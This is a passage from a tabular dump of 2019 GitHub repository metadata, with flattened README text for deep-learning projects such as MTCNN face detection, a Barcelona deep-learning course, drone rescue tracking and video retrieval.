experience imgsize is better to be 384 The epochnbr is no longer important any more for imgsize like 384 usually training will early stop at epoch 20 22 But if you have a large dataset try to play with these parameters This model s preview model https github com ShawnHXH BankCard Recognizer blob master readme east png Manual locate is only available in GUI Here re some performance in gif manual locate1 https github com ShawnHXH BankCard Recognizer blob master readme manual 1 gif manual locate2 https github com ShawnHXH BankCard Recognizer blob master readme manual 2 gif gui Using QtDesigner to design UI and PyQt5 to finish other works Statement 1 The bankcard images are collecting from Internet if any images make you feel uncomfortable please contact me 2 If you have any issues post it in Issues Reference 1 https github com huoyijie AdvancedEAST 2 https www cnblogs com lillylin p 9954981 html,2019-07-28T11:08:35Z,2019-11-14T08:09:05Z,Python,ShawnHXH,User,3,5,1,52,master,ShawnHXH,1,0,0,0,0,0,1
Huxiaowan,Graduation-Project,n/a,Graduation Project This is my graduation project including the source code and paper which is named Differential recognition of lesions in thoracic X ray images based on deep learning XXXXX XDual Channel Split NetworkDCSNAUCArea Under Curve,2019-07-13T12:05:18Z,2019-10-21T16:02:38Z,Python,Huxiaowan,User,0,5,0,3,master,Huxiaowan,1,0,0,0,0,0,0
Vishu8,WIDER-Face-Detection-using-MTCNN,computer-vision#deep-learning#detect-faces#machine-learning#mtcnn#python3#tensorflow#tfrecords,WIDER Face Detection using MTCNN This is a tensorflow implementation of MTCNN for both training and testing of WIDER Face Detection Requirement 0 Ubuntu 14 04 or 16 04 or Mac 10 1 tensorflow 1 3 python3 6 https github com tensorflow tensorflow https github com tensorflow tensorflow 2 opencv 3 0 for python3 6 pip install opencv python 3 numpy 1 13 pip install numpy Prepare Data notice You should be at ROOTDIR preparedata if you want to run the following command Step1 Download Wider Face Training part only from Official Website http mmlab ie cuhk edu hk projects WIDERFace and unzip to replace WIDERtrain Step2 Run python genshuffledata py 12 to generate 12net training data Besides python gentfdata12net py provide you an example to build tfrecords file Remember changing and adding necessary params Step3 Run python tfgen12nethardexample py to generate hard sample Run python genshuffledata py 24 to generate random cropped training data Then run python gentfdata24net py to combine these output and generate tfrecords file Step4 Similar to last step Run python gen24nethardexample py to generate hard sample Run python genshuffledata py 48 to generate random cropped training data Then run python gentfdata48net py to combine these output and generate tfrecords file Training Example notice You should be at ROOTDIR if you want to run the following command if you have finished step 2 above you can run python src mtcnnpnettest py to do Pnet training Similarly after step 3 or step 4 you can run python src mtcnnrnettest py or python src mtcnnonettest py to train Rnet and Onet respectively Testing Example notice You should be at ROOTDIR if you want to run the following command You can run python testimg py YOURIMAGEPATH modeldir savemodel allinone saveimage True savename images sampletest jpg savefile sample txt to test mtcnn with the provided model You can also provide your own training model directory to do the test or use the newsaver model trained with less no of epochs If there are multiple models in the directory the program will automatically choose the model with the maximum iterations Results sample jpg images sampletest jpg Reference 1 MTCNN paper link Joint Face Detection and Alignment using Multi task Cascaded Convolutional Networks https arxiv org pdf 1604 02878v1 pdf 2 MTCNN official code MTCNN with Caffe https github com Seanlinx mtcnn,2019-07-16T21:48:06Z,2019-12-07T06:42:57Z,Python,Vishu8,User,0,5,2,41,master,Vishu8,1,0,0,1,0,0,0
DataScienceUB,DeepLearningMaster20192020,n/a,DeepLearningMaster Repository This repository contains notebooks used in 2019 2020 DEEP LEARNING COURSE of the MASTER IN FUNDAMENTAL PRINCIPLES OF DATA SCIENCE http www ub edu datascience master of the Universitat de Barcelona Course Description Deep learning is one of the fastest growing areas of machine learning and a hot topic in both academia and industry This course will cover the basics of deep learning by using a hands on approach Course Instructor Jordi Vitri http www ub edu cvub jordivitria Class Time and Location First Semester September 2019 January 2020 Lectures Wednesday 17 00h 19 00h Location Aula B1 Facultat de Matemtiques i Informtica Universitat de Barcelona Map https www google es maps place Gran Via de les Corts Catalanes 585 08007 Barcelona 41 3865736 2 1619408 17z data 3m1 4b1 4m5 3m4 1s0x12a4a28cbeee3689 0x4b4a8ba716765923 8m2 3d41 3865736 4d2 1641295 hl ca Prerequisites Proficiency in Python 3 7 All class assignments will be in Python using tensorflow and keras Calculus Linear Algebra You should be comfortable taking derivatives and understanding matrix vector operations and notation Basic Probability and Statistics If you are not used to Git you can complete this free online git course https try github io levels 1 challenges 1 Grading Assignment 1 30 Submission deadline UB Campus Virtual 3 11 2019 Assignment 2 30 Submission deadline UB Campus Virtual 8 12 2019 Assignment 3 40 Submission deadline UB Campus Virtual 10 01 2020 Study groups are allowed but we expect students to understand and complete their own assignments and to hand in one assignment per student Course Agenda Introduction to Deep Learning and its applications Using the Jupyter notebook Docker Software stack Basic concepts learning from data Automated differentiation Backpropagation Training a Neural Network from Scratch Tensorflow programming model Dense Neural Networks Keras Recurrent Neural Netwoks I Recurrent Neural Netwoks II Embeddings Convolutional Neural Networks I Convolutional Neural Networks for Large Scale Learning Unsupervised Learning I Unsupervised Learning II Deep Reinforcement Learning Course Software Installation Working in Colab You can develop deep learning applications with Google Colaboratory Colab on the free Tesla K80 GPU using Keras and Tensorflow Colab is a Google internal research tool for data science They have released the tool sometime earlier to the general public with a goal of dissemination of machine learning education and research This is a free service that may not always be available and requires extra steps to ensure your work is saved Be sure to read the docs on the Colab web site to ensure you understand the limitations of the system For accessing Colab first of all you should sign in to you Google account if you are not signed in by default You must do this step before opening Colab otherwise the notebooks will not work Next head on to the Colab Welcome Page https colab research google com and click on Github In the Enter a GitHub URL or search by organization or user line enter https github com DataScienceUB DeepLearningMaster2019 You will see all the courses notebooks listed there Click on the one you are interested in using You should see your notebook displayed now Before running anything you need to tell Colab that you are interested in using a GPU You can do this by clicking on the Runtime tab and selecting Change runtime type A pop up window will open up with a drop down menu Select GPU from the menu and click Save When you run the first cell you will face a pop up saying Warning This notebook was not authored by Google you should leave the default tick in the Reset all runtimes before running check box and click on Run Anyway If you opened a notebook from Github you will need to save your work to Google Drive You can do this by clicking on File and then Save Click on SAVE A COPY IN DRIVE This will open up a new tab with the same file only this time located in your Drive If you want to continue working after saving use the file in the new tab Your notebook will be saved in a folder called Colab Notebooks in your Google Drive by default If you run a script which creates downloads files the files will NOT persist after the allocated instance is shutdown To save files you need to permit your Colaboratory instance to read and write files to your Google Drive Add the following code snippet at the beginning of every notebook python from google colab import drive drive mount content gdrive forceremount True rootdir content gdrive My Drive basedir rootdir masterUB Now you may access your Google Drive as a file sytem using standard python commands to both read and write files You can find more information in these blogs https medium com deep learning turkey google colab free gpu tutorial e113627b9f5d https medium com tensorflow colab an easy way to learn and use tensorflow d74d1686e309 Course Software Installation Working with Docker You can run the course software using a Docker container A gentle introduction to docker How Docker Can Help You Become A More Effective Data Scientist https towardsdatascience com how docker can help you become a more effective data scientist 7fc048ef91d5 Theres full documentation on installing Docker at docker com but in a few words the steps are Go to docs docker com in your browser Step one of the instructions sends you to download Docker Run that downloaded file to install Docker At the end of the install process a whale in the top status bar indicates that Docker is running and accessible from a terminal Click the whale to get Preferences and other options Open a command line terminal and run some Docker commands to verify that Docker is working as expected Some good commands to try are docker version to check that you have the latest release installed and docker ps and docker run hello world to verify that Docker is running By default Docker is set to use 2 processors You can increase processing power for the app by setting this to a higher number in Preferences or lower it to use fewer computing resources Memory By default Docker is set to use 2 GB runtime memory allocated from the total available memory on your computer You can increase the RAM on the app to get faster performance by setting this number higher for example to 3 or lower to 1 if you want Docker to use less memory Once Docker is installed you can download the image of this course and download this git repository In a terminal go to your course folder and run This operation requires a good internet connection it will take some minutes docker pull datascienceub deepub MacOS Linux Run the deepub image on your system docker run it p 8888 8888 p 6006 6006 v pwd notebooks datascienceub deepub Windows Run the deepub image on your system docker run it p 8888 8888 p 6006 6006 v C yourcoursefolderpath notebooks datascienceub deepub Once these steps have been done you can check the installation by starting your web browser and introducing the referred URL Finally to have the contents of this repository in your computer open terminal from your browser and execute this instruction git clone https github com DataScienceUB DeepLearningMaster2019 To run this image Windows In a terminal go to your course folder and run the deepub image on your system docker run it p 8888 8888 p 6006 6006 v C yourcoursefolderpath notebooks datascienceub deepub MacOS Linux In a terminal go to your course folder and run the deepub image on your system docker run it p 8888 8888 p 6006 6006 v pwd notebooks datascienceub deepub Start your web browser and introduce the corresponding URL Next times if there are new contents in the repository you can bring your local copy of the repository up to date Open a new Jupyter notebook and execute this instruction in a code cell git pull https github com DataScienceUB DeepLearningMaster2019,2019-07-30T15:20:28Z,2019-12-09T05:39:27Z,Jupyter Notebook,DataScienceUB,Organization,1,4,9,378,master,algorismes,1,0,0,8,0,8,1
dmqa,2019-Deep-Learning-Course,n/a,Deep Learning Course with DMQA 2019 Repository for course materials including slides hands on practices Materials for the Machine Learning Course https github com dmqa 2019 Machine Learning Course are also available Maintainers Seoung Bum Kim Young Joon Park Hankyu Lee Hyungu Kahng Yoonsang Cho Minjung Lee Jiyoon Lee Insung Baek Yongwon Cho Youngjae Lee Hyeongyu Kang,2019-07-11T07:37:06Z,2019-11-03T03:32:31Z,Jupyter Notebook,dmqa,User,1,4,5,41,master,drlego9#leejiyoon52#LMJung#yjpark1#dmqa,5,0,0,1,0,1,0
chxy95,Deep-Mutual-Learning,n/a,Deep Mutual Learning Implementation of Deep Mutual Learning by Pytorch to do classification on cifar100 The algorithm was proposed in Deep Mutual Learning CVPR 2017 Dependence Pytorch 1 0 0 tensorboard 1 14 0 Overview Overview of the algorithm Usage The default network for DML is ResNet32 Train 2 models using DML by main py python train py modelnum 2 Use tensorboard to monitor training process on choosing port tensorboard logdir logs port 6006 Result Network indavgacc Dmlavgacc ResNet32 69 83 71 03,2019-08-05T09:32:07Z,2019-11-29T12:53:12Z,Python,chxy95,User,2,4,5,8,master,chxy95,1,0,0,1,0,0,0
deeplearningfromscratch2,deep-learning-from-scratch-2,n/a,2 6 2 19 30 CHAPTER CHAPTER freethrow CHAPTER RNN CHAPTER freethrow 1 nullptr 2 3 word2vec 4 word2vec 5 RNN 6 RNN 7 RNN 8 2 1 RNN Feature RNN 2 1 GDG Pangyo kakao arena Federated Learning RNN,2019-07-03T07:52:47Z,2019-08-20T10:03:00Z,Jupyter Notebook,deeplearningfromscratch2,Organization,3,4,1,9,master,heejour#kgeneral#skydice#diemori,4,0,0,14,0,0,0
jess-s,SPAIC-DroneCV,n/a,DroneCV Project for Secure and Private AI Challenge robotics computer vision deep learning https github com jess s SPAIC DroneCV blob master images drone jpg SPAIC DroneCV How can you use a drone to track objects or people and what would be the use case for this implementation Throughout the weeks the team of the Drone Tracking study group have researched use cases implemented tutorials and tried to find information how to integrate federated learning and differential privacy with a drone Key Accomplishments Object tracking with OpenCV Colour tracking Object tracking with PyTorch Added code to a drone for object detection Authored articles tutorials for Computer Vision with Drones Use Case Our team considered many possible use cases for a drone that could follow a target which are discussed in the wiki page Use Cases within this github repo Initially we considered the safety benefits of a drone following a person with a health condition such as epilepsy dementia or a serious heart condition as they move through public space We also considered the benefits for atheletes to have a drone follow them as they train possibly recording data about the route pace terrain and performance to develop personalize training programs But ultimately we decided to focus on the use case of Rescue at Sea because it holds great potential for positive impact Our team has unique insight into this dangerous situation Drone CV Rescue at Sea Helena s insights Having worked at sea as a mechanic for the first part of my professional life I have been trained in safety at sea When we started working with our DroneCV project we thought of different use cases for a drone that could track people or an object One of the use cases was A drone could be helpful to follow and localize people at sea A drone connected to a ship or sailboat could be helpful in case of emergency and keep track of people falling overboard or and detect them if the ship sinks If ships had rescue drones onboard these could be used in case of man overboard Even a calm day with almost no waves it is very hard to detect someone that has fallen overboard from a ship If someone fell overboard a rescue drone could be sent out to track that person in the water and function as a beacon for the rescue crew It could also drop a life west or a float for the person in the water This rescue drone could also be used from shore It could work as an additional help for life guards along the beaches We have demonstrated the tracking of people superheroes in water through this YouTube video with real drone footage Drone tracking a ship and people superheroes overboard https youtu be MBKmas Z4c no superheroes were harmed in the making of this video The object tracking is implemented in PyTorch and the code can be found here https github com jess s SPAIC DroneCV tree master PyTorchObjecttracking The drone used for the video is a Heron Drone https www kjell com se produkter hem kontor fritid fritid dronare quadrocopter dronare med kamera heron dronare med kamera p51107 gclid CjwKCAjw7uPqBRBlEiwAYDsr12AkBzrjregM2xXXO8sEZm3WuRMCH2uPEM7TDnVz154f1I0E8ZwcrRoCKwsQAvDBwE gclsrc aw ds During research after selecting this use case we discovered that it had been selected as an AI for Social Good Workshop at neurIPS https aiforsocialgood github io 2018 pdfs track2 50aisgneurips2018 pdf in 2018 which supports the value of this use case Team Members Jess https github com jess s Jess Helena Barmer https github com helenabarmer Helena Barmer Shashi Gharti https github com shashigharti Shashi Gharti Arunn Thevapalan https github com arunn thevapalan Arunn Shashank Jain https github com Shashankjain12 Shashank Jain Temitope Oladokun https github com TemitopeOladokun Temitope Oladokun Wiki pages Please make sure to read the wiki page where we have written articles and shared resources Article Drones Track athletes outdoor activities and medically resuscitate https github com jess s SPAIC DroneCV wiki Article Drones Track athletes outdoor activities and medically resuscitate Temitope Oladokun Article Real Time Object Detection at a Glance https github com jess s SPAIC DroneCV wiki Article Real Time Object Detection at a Glance Temitope Oladokun Article What is Real Time Object Detection https github com jess s SPAIC DroneCV wiki Article What is Real Time Object Detection 3F Jess Future implementations https github com jess s SPAIC DroneCV wiki Future implementations Links and resources https github com jess s SPAIC DroneCV wiki Links and resources Resources Federated Learning and Drones https github com jess s SPAIC DroneCV wiki Resources Federated Learning and Drones Jess Resources Object tracking in PyTorch https github com jess s SPAIC DroneCV wiki Resources Object tracking in PyTorch Helena Tutorial Computer Vision with Jetson Nano https github com jess s SPAIC DroneCV wiki Tutorial Computer Vision with Jetson Nano Jess Use Cases https github com jess s SPAIC DroneCV wiki Use Cases Virtual Meetups summary https github com jess s SPAIC DroneCV wiki Virtual Meetups summary Helena,2019-08-01T18:48:39Z,2019-11-25T23:01:53Z,Python,jess-s,User,3,4,7,64,master,jess-s#helenabarmer#shashigharti#Shashankjain12#arunnthevapalan#nancyalaswad90,6,0,0,15,0,0,5
AurelienTran,DeepLearning,demo#javascript#neural-network,DeepLearning This is a project to build a simple neural network library from scratch using Javascript The purpose of this project is to learn how Deep Learning work step by step This project will also include simple demo The following page is running the current master branch demo https aurelientran github io DeepLearning Features Neural network library The neuron activation function is sigmoid Other activation are not supported Configurable number of layer Configurable number of neuron for each layer Configurable learning rate Back propagation using Stochastic or Batch gradient descent Future work Under consideration Unsupervised learning Convolution neural network How to use this library Your project need to include the two following javascript file libs DeepLearning Matrix js libs DeepLearning NeuralNetwork js Sample Code javascript Initialize and configure neural network with Input layer with 2 neuron First Hidden layer with 3 neuron Second Hidden layer with 4 neuron Output layer with 1 neuron let nn new NeuralNetwork 2 3 4 1 Set training learning rate of 0 1 nn setLearningRate 0 1 Set number of training sample used for updating neural network weight and bias nn setBatchSize 8 Train the neural network x1 neural network input array y1 neural network expected output array nn train x1 x2 y1 Guess ouput based on input array return y1 which is an array of number between 0 and 1 let ouput nn guess x1 x2 Authors Aurelien Tran aurelien tran gmail com,2019-07-19T10:04:25Z,2019-11-11T09:29:27Z,JavaScript,AurelienTran,User,1,4,0,32,master,AurelienTran,1,3,3,0,0,0,0
D0miH,deep-learning-super-mario,actor-critic#deep-learning#deep-reinforcement-learning#mario#neuro-evolution#reinforcement-learning#super-mario-bros#super-mario-bros-ai#torch,deep learning super mario In this repo we tried several approaches in deep reinforcement learning to play Super Mario Bros Actor Critic Approach actor critic world 1 1 github ac world1 1 gif actor critic world 1 1 github ac world1 2 gif Neural Evolution Approach actor critic world 1 1 github neural evolution world1 1 gif,2019-06-27T16:09:59Z,2019-10-07T14:24:08Z,Python,D0miH,User,1,4,0,70,master,D0miH#kaesebrot109#dhartung,3,0,0,0,0,0,0
idotc,Deep_learning_practice,n/a,Deeplearningpractice 1Caffeprototxtmodel Caffemodelcaffemodelload 2Effective Block 2 1 Resnet Block Example effectiveblock ResnetBlock resnet png 2 2 DenseBlock 2 3 InceptionV1 4Block 2 4 MobilenetBlock 2 5 ResnextBlock 2 6 SEBlock channel attention block 2 7 SABlock self attention block 2 8 ShufflenetBlock 2 9 SqueezeBlock 2 10 CBAMBlock 3Normalition 3 1 Batch Normalization BN 3 2 Layer Normalization LN 3 3 Instance Normalization IN 3 4 Group Normalization GN 4h5tojson h5groundtruthjson 5Evaluation method 5 1 IOU 5 2 AUC,2019-07-08T15:26:18Z,2019-10-10T15:30:26Z,Jupyter Notebook,idotc,User,0,4,0,50,master,idotc,1,0,0,0,0,0,0
EliShayGH,deep-learning-style-transfer,n/a,Deep Learning Style Transfer This is a small project I created while participating in the Udacity Deep Learning Nanodegree The goal of the project was to use a pre trained convolutional neural network to transfer style from one image to another based on the Image Style Transfer Using Convolutional Neural Networks https www cv foundation org openaccess contentcvpr2016 papers GatysImageStyleTransferCVPR2016paper pdf article In order to do so I used the VGG19 pre trained model with alpha of 1 and beta of 1e6 Code is written in python with PyTorch library on a Jupyter Notebook platform header png Table of Contents Load the Notebook load the notebook Dependencies dependencies Contributing contributing Load the Notebook Clone via Github https github com EliShayGH deep learning style transfer git Download a zip file https github com EliShayGH deep learning style transfer archive master zip Google Colab https colab research google com github EliShayGH deep learning style transfer blob master StyleTransferExercise ipynb Dependencies Anaconda Python 3 https www anaconda com Python libraries PyTorch numpy pandas matplotlib Jupyter Notebook https jupyter org Contributing If you are willing to contribute to this project you are more than welcome to send a pull request For details check out CONTRIBUTING md CONTRIBUTING md,2019-07-14T11:08:16Z,2019-11-27T08:41:27Z,Jupyter Notebook,EliShayGH,User,0,4,0,4,master,EliShayGH,1,0,0,0,0,0,0
nobug-code,Deep_Mutual_Learning_pytorch,n/a,DeepMutualLearningpytorch,2019-07-03T07:52:54Z,2019-12-01T12:03:12Z,Python,nobug-code,User,0,4,0,2,master,nobug-code,1,0,0,0,0,0,0
ThomasDelteil,deep-learning-gluon-london,n/a,MXNet workshop in London Title Length Presenter 00 What is computer vision 30 Thomas Delteil 01 Introduction to Deep Learning 30 Thomas Delteil 02 Introduction to MXNet Gluon and Amazon SageMaker 30 Thomas Delteil Break 15 03 Gluon Crash Course lab 90 Thomas Delteil Lunch Break 60 04 Gluon CV and Computer Vision lab 60 Thomas Delteil 05 Object Detection lab 60 Thomas Delteil Break 15 06 Generating Images lab 60 Thomas Delteil,2019-07-02T03:57:37Z,2019-09-08T15:02:50Z,Jupyter Notebook,ThomasDelteil,User,0,4,0,1,master,ThomasDelteil,1,0,0,0,0,0,0
laurahanu,Deep-Learning-Resources,cheatsheets#classification#computer-vision#data-augmentation#deep-learning#deep-learning-tutorials#explainable-ai#introduction-to-deep-learning#introduction-to-machine-learning#machine-learning#object-detection#python#python3#segmentation#tutorials#unsupervised-learning,ML Resources https img shields io badge contributions welcome brightgreen svg style flat https badges frapsoft com os v2 open source png v 103 Deep Learning Resources Motivation The aim of this project is to provide a curated list of high quality Deep Learning Resources that I have found valuable and insightful These are organised into separate sections that can be seen in the Table of Contents below Table of Contents 1 Deep Learning Theory 1 Quick Intro s11 Beginner s12 Intermediate to Advanced s13 2 Computer vision 2 Classification s21 Object detection s22 Segmentation s23 3 Unsupervised learning 3 4 Data Augmentation 4 5 Lectures Tutorials 5 6 Explainable AI 6 7 Python DL Cheatsheets 7 8 Cool DL examples repos 8 9 AI newsletters blogs 9 First a quick catch up into the State of the Art in Deep learning 2019 MIT s Lex Fridman Nathan Benaich 1 Deep Learning Theory Loss landscape This section will provide useful links for an introduction into core Deep learning concepts from begginer to advanced level Quick intro Deep learning in 100 lines of code Beginner level Stanford CS 231n CNNs class Deep Learning Book by Ian Goodfellow Yoshua Bengio and Aaron Courville Stanford Deep Learing Tutorial Neural Networks and Deep Learning Chris Olah s personal github Intermediate to Advanced level Imperial College London Deep learning Course Jupyter notebook Pattern Recognition and Machine Learning Book by Christopher M Bishop Fast AI Distill Pub for interpretable AI Chris Olah s github Papers with code Deep learning tricks NVIDIA Deep Learning examples Pytorch Tensorflow 2 Computer vision This section includes useful Github repositories to get going in training Computer vision algorithms Classification ImageNet Top Board Keras model library Pytorch model library Efficient Net Learning Semantic Boundaries from Noisy Annotations Ensemble methods ADANet Object detection Tensorflow Object Detection API Mask R CNN Pytorch https github com facebookresearch maskrcnn benchmark Keras RetinaNet Pytorch Keras YOLO v3 Pytorch Keras RefineDet Pytorch Keras SNIPER MXNet M2Det Pytorch Segmentation UNet Pytorch Keras Attention U Net Pytorch SegNet Pytorch Keras DeepLab v3 Pytorch Keras Reversible UNet Pytorch Fast Semantic Segmentation Network Pytorch Automatic Hyperparameter Search Talos automatic Hyperparameter tuning Fast prototyping with keras models Hyperparameter tuning magic from Francois Chollet 3 Unsupervised learning GAN lab visualisation Style GAN Compare GANs Latent GAN BigGAN Vid2Vid 4 Data Augmentation This section consists in a list of data augmentation packages that can be used for model training for a more robust and generalizable model Albumentations Data transformation augmentation package in Numpy Python library for augmenting images Augmentor image augmentation library in Python for machine learning 1000x Faster Data Augmentation from Berkeley Artificial Intelligence Research BAIR AutoAugment Learning Augmentation Policies from Data 5 Lectures or tutorials This section includes livestreams of TOP AI conferences or DL tutorials ICML IJCAI ECAI 2018 Conference Videos The Artificial Intelligence Channel NVIDIA Developer CVPR lectures tutorials Google Developers CogX RAAIS Lex Fridman s AI Podcast ARXIv Insights ICML 2019 notes All posters from ICML 2019 6 Explainable AI This section has a selection of python packages that try to make DL model outcomes more explainable Seldon Alibi XAI an explainability tool for machine learning maintained by The Institute for Ethical AI ML Deepmind s blog on Robust and Verified AI Microsoft python package for training interpretable models and explaining blackbox systems Adversarial Robustness Toolbox Ludwig a toolbox that allows to train and test deep learning models without code SHAP a unified approach to explain the output of any machine learning model Anatomy of an AI system The Amazon Echo as an anatomical map of human labor data and planetary resources Sanity Checks for Saliency Maps NeurIPS Paper DeepExplain attribution methods for Deep Learning IBM fairness AI 7 Python ML Cheatsheets Great talk about Expert level python tricks concepts from PyData Python tips AI cheatsheets Python 3 Tricks 8 Cool DL examples repos This section includes some cool models tricks and miscellaneous DL Github repos Kito a Keras inference time optimizer How to fit any dataset with a single parameter A Recipe for Training Neural Networks LyreBird Activation Atlases BERT Similarity visualisation Deep painterly harmonization AI playground BigGAN generation with TF Hub Learning resources Snorkel Deep image prior Sherpa DL recommendation model 3D deep learning from BMVA 9 AI newsletters blogs This section includes some newsletters and personal blogs I have found interesting and worth reading Nathan ai Exponential View Andrej Karpathy Chris Olah OpenAI Google Research Blog,2019-07-29T15:44:25Z,2019-11-22T21:05:02Z,n/a,laurahanu,User,2,4,1,2,master,laurahanu,1,0,0,0,0,0,0
li-xirong,w2vvpp,avs#deep-learning#query-representation#video-retrieval,w2vvpp W2VV A fully deep learning solution for ad hoc video search The code assumes video level CNN features https github com xuchaoxi video cnn feat have been extracted Requirements Ubuntu 16 04 cuda 10 python 2 7 12 PyTorch 1 2 0 tensorboard 1 14 0 numpy 1 16 4 We used virtualenv to setup a deep learning workspace that supports PyTorch Run the following script to install the required packages virtualenv system site packages w2vvpp source w2vvpp bin activate pip install r requirements txt deactivate Get started Data The sentence encoding network for W2VV namely MultiScaleTxtEncoder needs a pretrained word2vec w2v model In this work we use a w2v trained on English tags associated with 30 million Flickr images Run the following script to download the Flickr w2v model and extract the folder at HOME VisualSearch The zipped model is around 3 1 gigabytes so the download may take a while bash ROOTPATH HOME VisualSearch mkdir p ROOTPATH cd ROOTPATH download and extract pre trained word2vec wget http lixirong net data w2vv tmm2018 word2vec tar gz tar zxf word2vec tar gz The following three datasets are used for training validation and testing tgif msrvtt10k tv2016train and iacc 3 For more information about these datasets please see https github com li xirong avs Video feature data 4096 dim resnext101 resnet152 tgif msrvtt10k http lixirong net data mm2019 tgif msrvtt10k meanresnext101 resnet152 tar gz 1 6G tv2016train http lixirong net data mm2019 tv2016train meanresnext101 resnet152 tar gz 2 9M iacc 3 http lixirong net data mm2019 iacc 3 meanresnext101 resnet152 tar gz 4 7G bash get visual features per dataset wget http lixirong net data mm2019 tgif msrvtt10k meanresnext101 resnet152 tar gz wget http lixirong net data mm2019 tv2016train meanresnext101 resnet152 tar gz wget http lixirong net data mm2019 iacc 3 meanresnext101 resnet152 tar gz Sentence data Sentences tgif msrvtt10k http lixirong net data mm2019 tgif msrvtt10k sent tar gz tv2016train http lixirong net data mm2019 tv2016train sent tar gz TRECVID 2016 2017 2018 AVS topics and ground truth iacc 3 http lixirong net data mm2019 iacc 3 avs topics tar gz TRECVID 2019 AVS topics and ground truth v3c1 http lixirong net data tv19 v3c1 avs topics tar gz bash get sentences wget http lixirong net data mm2019 tgif msrvtt10k sent tar gz wget http lixirong net data mm2019 tv2016train sent tar gz wget http lixirong net data mm2019 iacc 3 avs topics tar gz Pre trained models w2vvppresnext101resnet152subspacev190916 pth tar http lixirong net data mm2019 w2vvppresnext101resnet152subspacev190916 pth tar 240 MB Model TV16 TV17 TV18 OVERALL w2vvppresnext101resnet152subspacev190916 0 162 0 223 0 101 0 162 Model TV19 w2vvppresnext101resnet152subspacev190916 0 139 Note that due to SGD based training the performance of a single model learned from scratch might differ slightly from those reported in the ACMMM 19 paper For better and stable performance ensemble is suggested Scripts for training testing and evaluation Before executing the following scripts please check if the environment data software etc is ready by running testenv py testenv py bash python testenv py testrootpath main TestSuite ok testtestdata main TestSuite ok testtraindata main TestSuite ok testvaldata main TestSuite ok testw2vdir main TestSuite ok Ran 5 tests in 0 001s OK Do everything from sratch bash source w2vvpp bin activate build vocabulary on the training set dobuildvocab sh train w2vvpp on tgif msrvtt10k based on config w2vvppresnext101 resnet152subspace trainCollection tgif msrvtt10k valCollection tv2016train valset setA modelconfig w2vvppresnext101 resnet152subspace dotrain sh trainCollection valCollection valset modelconfig test w2vvpp on iacc 3 modelpath rootpath trainCollection w2vvpptrain valCollection valset modelconfig runs0 modelbest pth tar simname trainCollection valCollection valset modelconfig runs0 dotest sh iacc 3 modelpath simname tv16 avs txt tv17 avs txt tv18 avs txt cd tv avs eval doeval sh iacc 3 tv16 simname doeval sh iacc 3 tv17 simname doeval sh iacc 3 tv18 simname Test and evaluate a pre trained model Assume the model has been placed at the following path bash VisualSearch w2vvpp w2vvppresnext101resnet152subspacev190916 pth tar bash apply a pre trained w2vvpp model on iacc 3 for answering tv16 tv17 tv18 queries dotest sh iacc 3 VisualSearch w2vvpp w2vvppresnext101resnet152subspacev190916 pth tar w2vvppresnext101resnet152subspacev190916 tv16 avs txt tv17 avs txt tv18 avs txt evaluate the performance cd tv avs eval doeval sh iacc 3 tv16 w2vvppresnext101resnet152subspacev190916 tv16 infAP 0 162 doeval sh iacc 3 tv17 w2vvppresnext101resnet152subspacev190916 tv17 infAP 0 223 doeval sh iacc 3 tv18 w2vvppresnext101resnet152subspacev190916 tv18 infAP 0 101 bash apply a pre trained w2vvpp model on v3c1 for answering tv19 queries dotest sh v3c1 VisualSearch w2vvpp w2vvppresnext101resnet152subspacev190916 pth tar w2vvppresnext101resnet152subspacev190916 tv19 avs txt evaluate the performance cd tv avs eval doeval sh v3c1 tv19 w2vvppresnext101resnet152subspacev190916 tv19 infAP 0 139 Tutorials 1 Use a pre trained w2vv model to encode a given sentence tutorial ipynb Citation inproceedingsmm19 w2vvpp title W2VV Fully Deep Learning for Ad hoc Video Search author Xirong Li and Chaoxi Xu and Gang Yang and Zhineng Chen and Jianfeng Dong year 2019 booktitle ACMMM,2019-08-05T06:14:03Z,2019-12-09T03:19:42Z,Python,li-xirong,User,4,4,4,54,master,xuchaoxi#li-xirong,2,0,1,0,0,0,0
IrohXu,Chromosome_Classification_Deep_Learning_Method,n/a,ChromosomeClassificationDeepLearningMethod It is a project based on IJCNN s paper Automatic Chromosome Classification using Deep Attention Based Sequence Learning of Chromosome Bands and process some new methods From this project we can use this deep learning chromosome classification machine to help doctor realize the chromosome classification and segmentation It is such a convinent method that may save much time,2019-07-15T11:13:09Z,2019-08-01T19:43:32Z,Jupyter Notebook,IrohXu,User,0,4,0,10,master,IrohCao#IrohXu#lxqjdai,3,0,0,0,0,0,0
Fadis,kernelvm_20190720_samples,n/a,kernelvm20190720samples Deep learning demo in Vulkan Requirements CMake 2 8 Boost 1 65 0 Vulkan 1 1 VKLAYERLUNARGstandardvalidation is required to run in validation mode OpenImageIO Build instruction cd SOURCEDIR mkdir build cd build cmake make cd shaders compile sh mv spv build cd build Dataset Decompressed MNIST or compatible dataset is required MNIST http yann lecun com exdb mnist Fashion MNIST https github com zalandoresearch fashion mnist,2019-07-19T01:38:30Z,2019-07-22T09:34:38Z,C++,Fadis,User,0,4,0,3,master,Fadis,1,0,0,0,0,0,0
oservo,aiFi,ai#ann#artificial-intelligence#artificial-neural-network#c#deep-learning#dl#machine-learning#ml#mlp#multi-layer-perceptron,About aiFi aiFi is a Multi Layer Perceptron MLP Artificial Neural Network ANN Framework Developed in C Simple super fast https oservo github io aiFi aiFi is accessible powerful and provides tools required for large robust AI applications Learning aiFi aiFi aims to provide the most extensive and thorough documentation https oservo github io aiFi and video tutorial library of all modern multi layer perceptron making it a breeze to get started with this aiFi Sponsors We would like to extend our thanks to the following sponsors for funding aiFi development If you are interested in becoming a sponsor please visit the aifi Patreon page https patreon com oservo Chief ERP http chieferp com WpSocket http wpsocket com ThingularOS http thingularos com Contributing Thank you for considering contributing to the aiFi The contribution guide can be found in the aiFi documentation https oservo github io aiFi License The aiFi framework is open source software licensed under the MIT license https opensource org licenses MIT,2019-07-13T11:33:14Z,2019-11-23T09:44:00Z,C,oservo,Organization,2,4,3,27,master,eknoyon#istiyakaminsanto#mnislam01,3,0,0,2,3,0,2
